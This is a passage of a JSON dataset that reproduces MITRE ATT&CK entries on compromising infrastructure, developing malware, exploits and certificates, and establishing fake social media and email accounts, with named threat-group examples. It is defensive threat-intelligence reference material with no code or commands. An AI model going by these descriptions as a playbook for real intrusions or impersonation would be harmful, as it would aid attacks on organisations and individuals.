and/or Phishing campaigns. Additionally, adversaries may also compromise infrastructure to support Proxy and/or proxyware services.\nBy using compromised infrastructure, adversaries may make it difficult to tie their actions back to them. Prior to targeting, adversaries may compromise the infrastructure of other adversaries.", "id": "T1584", "examples": [], "sub_techniques": [{"name": "Domains", "description": "Adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant. Adversaries may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account, taking advantage of renewal process gaps, or compromising a cloud service that enables managing domains (e.g., AWS Route53).", "detailed_description": "Adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant. Adversaries may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account, taking advantage of renewal process gaps, or compromising a cloud service that enables managing domains (e.g., AWS Route53).\nSubdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.\nAdversaries who compromise a domain may also engage in domain shadowing by creating malicious subdomains under their control while keeping any existing DNS records. As service will not be disrupted, the malicious subdomains may go unnoticed for long periods of time.", "id": "T1584.001", "examples": [{"id": "G0006", "name": "APT1", "description": "APT1 hijacked FQDNs associated with legitimate websites hosted by hop points."}, {"id": "C0010", "name": "C0010", "description": "During C0010, UNC3890 actors likely compromised the domain of a legitimate Israeli shipping company."}, {"id": "C0021", "name": "C0021", "description": "For C0021, the threat actors used legitimate but compromised domains to host malicious payloads."}, {"id": "S1138", "name": "Gootloader", "description": "Gootloader has used compromised legitimate domains to as a delivery network for malicious payloads."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has compromised legitimate sites and used them to distribute malware."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used compromised domains to host links targeted to specific phishing victims."}, {"id": "G1020", "name": "Mustard Tempest", "description": "Mustard Tempest operates a global network of compromised websites that redirect into a traffic distribution system (TDS) to select victims for a fake browser update page."}, {"id": "C0022", "name": "Operation Dream Job", "description": "For Operation Dream Job, Lazarus Group compromised domains in Italy and other countries for their C2 infrastructure."}, {"id": "G1008", "name": "SideCopy", "description": "SideCopy has compromised domains for some of their infrastructure, including for C2 and staging malware."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "For the SolarWinds Compromise, APT29 compromised domains to use for C2."}, {"id": "G0134", "name": "Transparent Tribe", "description": "Transparent Tribe has compromised domains for use in targeted malicious campaigns."}]}, {"name": "DNS Server", "description": "Adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: Application Layer Protocol). Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.", "detailed_description": "Adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: Application Layer Protocol). Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.\nBy compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.  Additionally, adversaries may leverage such control in conjunction with Digital Certificates to redirect traffic to adversary-controlled infrastructure, mimicking normal trusted network communications. Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server.", "id": "T1584.002", "examples": [{"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has reconfigured a victim's DNS records to actor-controlled domains and websites."}]}, {"name": "Virtual Private Server", "description": "Adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.", "detailed_description": "Adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.\nCompromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.", "id": "T1584.003", "examples": [{"id": "G0010", "name": "Turla", "description": "Turla has used the VPS infrastructure of compromised Iranian threat actors."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has compromised Virtual Private Servers (VPS) to proxy C2 traffic."}]}, {"name": "Server", "description": "Adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of purchasing a Server or Virtual Private Server, adversaries may compromise third-party servers in support of operations.", "detailed_description": "Adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of purchasing a Server or Virtual Private Server, adversaries may compromise third-party servers in support of operations.\nAdversaries may also compromise web servers to support watering hole operations, as in Drive-by Compromise, or email servers to support Phishing operations.", "id": "T1584.004", "examples": [{"id": "G0023", "name": "APT16", "description": "APT16 has compromised otherwise legitimate sites as staging servers for second-stage payloads."}, {"id": "G1034", "name": "Daggerfly", "description": "Daggerfly compromised web servers hosting updates for software as part of a supply chain intrusion."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has compromised legitimate websites to host C2 and malware modules."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has used compromised web servers as part of their operational infrastructure."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has served fake updates via legitimate websites that have been compromised."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has compromised servers to stage malicious tools."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors compromised web servers to use for C2."}, {"id": "C0022", "name": "Operation Dream Job", "description": "For Operation Dream Job, Lazarus Group compromised servers to host their malicious tools."}, {"id": "C0013", "name": "Operation Sharpshooter", "description": "For Operation Sharpshooter, the threat actors compromised a server they used as part of the campaign's infrastructure."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team compromised legitimate Linux servers running the EXIM mail transfer agent for use in subsequent campaigns."}, {"id": "G0010", "name": "Turla", "description": "Turla has used compromised servers as infrastructure."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used compromised Paessler Router Traffic Grapher (PRTG) servers from other organizations for C2."}]}, {"name": "Botnet", "description": "Adversaries may compromise numerous third-party systems to form a botnet that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks. Instead of purchasing/renting a botnet from a booter/stresser service, adversaries may build their own botnet by compromising numerous third-party systems. Adversaries may also conduct a takeover of an existing botnet, such as redirecting bots to adversary-controlled C2 servers. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale Phishing or Distributed Denial of Service (DDoS).", "detailed_description": "Adversaries may compromise numerous third-party systems to form a botnet that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks. Instead of purchasing/renting a botnet from a booter/stresser service, adversaries may build their own botnet by compromising numerous third-party systems. Adversaries may also conduct a takeover of an existing botnet, such as redirecting bots to adversary-controlled C2 servers. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale Phishing or Distributed Denial of Service (DDoS).", "id": "T1584.005", "examples": [{"id": "G0001", "name": "Axiom", "description": "Axiom has used large groups of compromised machines for use as proxy nodes."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used a large-scale botnet to target Small Office/Home Office (SOHO) network devices."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon Volt Typhoon has used compromised Cisco and NETGEAR end-of-life SOHO routers implanted with KV Botnet malware to support operations."}]}, {"name": "Web Services", "description": "Adversaries may compromise access to third-party web services that can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, SendGrid, etc. Adversaries may try to take ownership of a legitimate user's access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control (Web Service), Exfiltration Over Web Service, or Phishing. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them. Additionally, leveraging compromised web-based email services may allow adversaries to leverage the trust associated with legitimate domains.", "detailed_description": "Adversaries may compromise access to third-party web services that can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, SendGrid, etc. Adversaries may try to take ownership of a legitimate user's access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control (Web Service), Exfiltration Over Web Service, or Phishing. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them. Additionally, leveraging compromised web-based email services may allow adversaries to leverage the trust associated with legitimate domains.", "id": "T1584.006", "examples": [{"id": "G1012", "name": "CURIUM", "description": "CURIUM has compromised legitimate websites to enable strategic website compromise attacks."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has compromised Google Drive repositories."}, {"id": "S1138", "name": "Gootloader", "description": "Gootloader can insert malicious scripts to compromise vulnerable content management systems (CMS)."}, {"id": "G0010", "name": "Turla", "description": "Turla has frequently used compromised WordPress sites for C2 infrastructure."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern has used compromised WordPress sites to host malicious payloads for download."}]}, {"name": "Serverless", "description": "Adversaries may compromise serverless cloud infrastructure, such as Cloudflare Workers, AWS Lambda functions, or Google Apps Scripts, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.", "detailed_description": "Adversaries may compromise serverless cloud infrastructure, such as Cloudflare Workers, AWS Lambda functions, or Google Apps Scripts, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.\nOnce compromised, the serverless runtime environment can be leveraged to either respond directly to infected machines or to Proxy traffic to an adversary-owned command and control server. As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers - making it easier to Hide Infrastructure.", "id": "T1584.007", "examples": []}, {"name": "Network Devices", "description": "Adversaries may compromise third-party network devices that can be used during targeting. Network devices, such as small office/home office (SOHO) routers, may be compromised where the adversary's ultimate goal is not Initial Access to that environment -- instead leveraging these devices to support additional targeting.", "detailed_description": "Adversaries may compromise third-party network devices that can be used during targeting. Network devices, such as small office/home office (SOHO) routers, may be compromised where the adversary's ultimate goal is not Initial Access to that environment -- instead leveraging these devices to support additional targeting.\nOnce an adversary has control, compromised network devices can be used to launch additional operations, such as hosting payloads for Phishing campaigns (i.e., Link Target) or enabling the required access to execute Content Injection operations. Adversaries may also be able to harvest reusable credentials (i.e., Valid Accounts) from compromised network devices.\nAdversaries often target Internet-facing edge devices and related network appliances that specifically do not support robust host-based defenses.\nCompromised network devices may be used to support subsequent Command and Control activity, such as Hide Infrastructure through an established Proxy and/or Botnet network.", "id": "T1584.008", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 compromised Ubiquiti network devices to act as collection devices for credentials compromised via phishing webpages."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors used compromised and out-of-support Cyberoam VPN appliances for C2."}, {"id": "C0035", "name": "KV Botnet Activity", "description": "KV Botnet Activity focuses on compromise of small office-home office (SOHO) network devices to build the subsequent botnet."}, {"id": "C0039", "name": "Versa Director Zero Day Exploitation", "description": "Versa Director Zero Day Exploitation used compromised small office/home office (SOHO) devices to interact with vulnerable Versa Director servers."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has compromised small office and home office (SOHO) network edge devices, many of which were located in the same geographic area as the victim, to proxy network traffic."}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM has compromised network devices such as small office and home office (SOHO) routers and IoT devices for ORB (operational relay box) Proxy networks."}]}]}, {"name": "Develop Capabilities", "description": "Adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.", "detailed_description": "Adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.\nAs with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.", "id": "T1587", "examples": [{"id": "G0094", "name": "Kimsuky", "description": "Kimsuky created and used a mailing toolkit to use in spearphishing attacks."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet developed malicious npm packages for delivery to or retrieval by victims."}], "sub_techniques": [{"name": "Malware", "description": "Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.", "detailed_description": "Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\nAs with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.\nSome aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of Web Services.", "id": "T1587.001", "examples": [{"id": "G1007", "name": "Aoqin Dragon", "description": "Aoqin Dragon has used custom malware, including Mongall and Heyoka Backdoor, in their operations."}, {"id": "G0016", "name": "APT29", "description": "APT29 has used unique malware in many of their operations."}, {"id": "C0010", "name": "C0010", "description": "For C0010, UNC3890 actors used unique malware, including SUGARUSH and SUGARDUMP."}, {"id": "G0003", "name": "Cleaver", "description": "Cleaver has created customized tools and payloads for functions including ARP poisoning, encryption, credential dumping, ASP.NET shells, web backdoors, process enumeration, WMI querying, HTTP and SMB communications, network interface sniffing, and keystroke logging."}, {"id": "C0004", "name": "CostaRicto", "description": "For CostaRicto, the threat actors used custom malware, including PS1, CostaBricks, and SombRAT."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has utilized custom malware to maintain persistence in a compromised environment."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has developed malware for use in operations, including the creation of infected removable media."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has developed malware for their operations, including ransomware such as BitPaymer and WastedLocker."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has developed custom malware that allowed them to maintain persistence on victim networks."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has developed its own unique malware such as MailFetch.py for use in operations."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has developed custom malware for use in their operations."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has used unique malware for information theft and exfiltration."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet has developed custom malware, including a malware delivery mechanism masquerading as a legitimate game."}, {"id": "G1009", "name": "Moses Staff", "description": "Moses Staff has built malware, such as DCSrv and PyDCrypt, for targeting victims' machines."}, {"id": "C0022", "name": "Operation Dream Job", "description": "For Operation Dream Job, Lazarus Group developed custom tools such as Sumarta, DBLL Dropper, Torisma, and DRATzarus for their operations."}, {"id": "C0023", "name": "Operation Ghost", "description": "For Operation Ghost, APT29 used new strains of malware including FatDuke, MiniDuke, RegDuke, and PolyglotDuke."}, {"id": "C0013", "name": "Operation Sharpshooter", "description": "For Operation Sharpshooter, the threat actors used the Rising Sun modular backdoor."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors developed their own custom webshells to upload to compromised servers."}, {"id": "G1040", "name": "Play", "description": "Play developed and employ Playcrypt ransomware."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has created its own tools to use during operations."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has developed malware for its operations, including malicious mobile applications and destructive malware such as NotPetya and Olympic Destroyer."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "For the SolarWinds Compromise, APT29 used numerous pieces of malware that were likely developed for or by the group, including SUNBURST, SUNSPOT, Raindrop, and TEARDROP."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has developed custom malware such as Hildegard."}, {"id": "C0030", "name": "Triton Safety Instrumented System Attack", "description": "In the Triton Safety Instrumented System Attack, TEMP.Veles developed, prior to the attack, malware capabilities that would require access to specific and specialized hardware and software."}, {"id": "G0010", "name": "Turla", "description": "Turla has developed its own unique malware for use in operations."}, {"id": "C0039", "name": "Versa Director Zero Day Exploitation", "description": "Versa Director Zero Day Exploitation involved the development of a new web shell variant, VersaMem."}]}, {"name": "Code Signing Certificates", "description": "Adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with. Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.", "detailed_description": "Adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with. Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.\nPrior to Code Signing, adversaries may develop self-signed code signing certificates for use in operations.", "id": "T1587.002", "examples": [{"id": "G1034", "name": "Daggerfly", "description": "Daggerfly created code signing certificates to sign malicious macOS files."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group digitally signed their malware and the dbxcli utility."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork has created self-signed certificates from fictitious and spoofed legitimate software companies that were later used to sign malware."}, {"id": "G0056", "name": "PROMETHIUM", "description": "PROMETHIUM has created self-signed certificates to sign malicious installers."}]}, {"name": "Digital Certificates", "description": "Adversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).", "detailed_description": "Adversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).\nAdversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: Asymmetric Cryptography with Web Protocols) or even enabling Adversary-in-the-Middle if added to the root of trust (i.e. Install Root Certificate).\nAfter creating a digital certificate, an adversary may then install that certificate (see Install Digital Certificate) on infrastructure under their control.", "id": "T1587.003", "examples": [{"id": "G0016", "name": "APT29", "description": "APT29 has created self-signed digital certificates to enable mutual TLS authentication for malware."}, {"id": "C0011", "name": "C0011", "description": "For C0011, Transparent Tribe established SSL certificates on the typo-squatted domains the group registered."}, {"id": "G0056", "name": "PROMETHIUM", "description": "PROMETHIUM has created self-signed digital certificates for use in HTTPS C2 traffic."}]}, {"name": "Exploits", "description": "Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits. Adversaries may use information acquired via Vulnerabilities to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.", "detailed_description": "Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits. Adversaries may use information acquired via Vulnerabilities to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.\nAs with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. Exploit Public-Facing Application, Exploitation for Client Execution, Exploitation for Privilege Escalation, Exploitation for Defense Evasion, Exploitation for Credential Access, Exploitation of Remote Services, and Application or System Exploitation).", "id": "T1587.004", "examples": [{"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has exploited zero-day vulnerabilities for initial access."}]}]}, {"name": "Establish Accounts", "description": "Adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.", "detailed_description": "Adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.\nFor operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.\nEstablishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for Phishing for Information or Phishing. In addition, establishing accounts may allow adversaries to abuse free services, such as registering for trial periods to Acquire Infrastructure for malicious purposes.", "id": "T1585", "examples": [{"id": "G0025", "name": "APT17", "description": "APT17 has created and cultivated profile pages in Microsoft TechNet. To make profile pages appear more legitimate, APT17 has created biographical sections and posted in forum threads."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has created accounts on dark web forums to obtain various tools and malware."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has created KeyBase accounts to communicate with ransomware victims."}], "sub_techniques": [{"name": "Social Media Accounts", "description": "Adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.", "detailed_description": "Adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.\nFor operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona  on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.\nOnce a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others. These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: Spearphishing via Service).", "id": "T1585.001", "examples": [{"id": "G0050", "name": "APT32", "description": "APT32 has set up Facebook pages in tandem with fake websites."}, {"id": "G0003", "name": "Cleaver", "description": "Cleaver has created fake LinkedIn profiles that included profile photos, details, and connections."}, {"id": "G1012", "name": "CURIUM", "description": "CURIUM has established a network of fictitious social media accounts, including on Facebook and LinkedIn, to establish relationships with victims, often posing as an attractive woman."}, {"id": "G1011", "name": "EXOTIC LILY", "description": "EXOTIC LILY has established social media profiles to mimic employees of targeted companies."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has used a Twitter account to communicate with ransomware victims."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has established fraudulent LinkedIn accounts impersonating HR department employees to target potential victims with fake job offers."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has created social media accounts to monitor news and security trends as well as potential targets."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has created new Twitter accounts to conduct social engineering against potential victims."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has created new social media accounts for targeting efforts."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has created fake LinkedIn and other social media accounts to contact targets and convince them--through messages and voice communications--to open malicious links."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet has created social media accounts to interact with victims."}, {"id": "C0022", "name": "Operation Dream Job", "description": "For Operation Dream Job, Lazarus Group created fake LinkedIn accounts for their targeting efforts."}, {"id": "C0023", "name": "Operation Ghost", "description": "For Operation Ghost, APT29 registered Twitter accounts to host C2 nodes."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has established social media accounts to disseminate victim internal-only documents and other sensitive data."}, {"id": "G1033", "name": "Star Blizzard", "description": "Star Blizzard has established fraudulent profiles on professional networking sites to conduct reconnaissance."}]}, {"name": "Email Accounts", "description": "Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct Phishing for Information or Phishing. Establishing email accounts may also allow adversaries to abuse free services \u2013 such as trial periods \u2013 to Acquire Infrastructure for follow-on purposes.", "detailed_description": "Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct Phishing for Information or Phishing. Establishing email accounts may also allow adversaries to abuse free services \u2013 such as trial periods \u2013 to Acquire Infrastructure for follow-on purposes.\nAdversaries may also take steps to cultivate a persona around the email account, such as through use of Social Media Accounts, to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: Domains).\nTo decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.", "id": "T1585.002", "examples": [{"id": "G0006", "name": "APT1", "description": "APT1 has created email accounts for later use in social engineering, phishing, and when registering domains."}, {"id": "G1012", "name": "CURIUM", "description": "CURIUM has created dedicated email accounts for use with tools such as IMAPLoader."}, {"id": "G1011", "name": "EXOTIC LILY", "description": "EXOTIC LILY has created e-mail accounts to spoof targeted organizations."}, {"id": "C0007", "name": "FunnyDream", "description": "For FunnyDream, the threat actors likely established an identified email account to register a variety of domains that were used during the campaign."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has established email accounts for use in domain registration including for ProtonMail addresses."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has created email accounts to communicate with their ransomware victims, to include providing payment and decryption details."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has created email accounts for phishing operations."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has created new email accounts for spearphishing operations."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has created new email accounts for targeting efforts."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has established email accounts using fake personas for spearphishing operations."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet has created email accounts to interact with victims, including for phishing purposes."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has leveraged the legitimate email marketing service SMTP2Go for phishing campaigns."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group created fake email accounts to correspond with fake LinkedIn personas; Lazarus Group also established email accounts to match those of the victim as part of their BEC attempt."}, {"id": "C0016", "name": "Operation Dust Storm", "description": "For Operation Dust Storm, the threat actors established email addresses to register domains for their operations."}, {"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, attackers created email addresses to register for a free account for a control server used for the implants."}, {"id": "C0014", "name": "Operation Wocao", "description": "For Operation Wocao, the threat actors registered email accounts to use during the campaign."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has created email accounts that mimic legitimate organizations for its spearphishing operations."}, {"id": "G0122", "name": "Silent Librarian", "description": "Silent Librarian has established e-mail accounts to receive e-mails forwarded from compromised accounts."}, {"id": "G1033", "name": "Star Blizzard", "description": "Star Blizzard has registered impersonation email accounts to spoof experts in a particular field or individuals and organizations affiliated with the intended target."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has leveraged ProtonMail email addresses in ransom notes when delivering Ryuk ransomware."}]}, {"name": "Cloud Accounts", "description": "Adversaries may create accounts with cloud providers that can be used during targeting. Adversaries can use cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, MEGA, Microsoft OneDrive, or AWS S3 buckets for Exfiltration to Cloud Storage or to Upload Tools. Cloud accounts can also be used in the acquisition of infrastructure, such as Virtual Private Servers or Serverless infrastructure. Establishing cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.", "detailed_description": "Adversaries may create accounts with cloud providers that can be used during targeting. Adversaries can use cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, MEGA, Microsoft OneDrive, or AWS S3 buckets for Exfiltration to Cloud Storage or to Upload Tools. Cloud accounts can also be used in the acquisition of 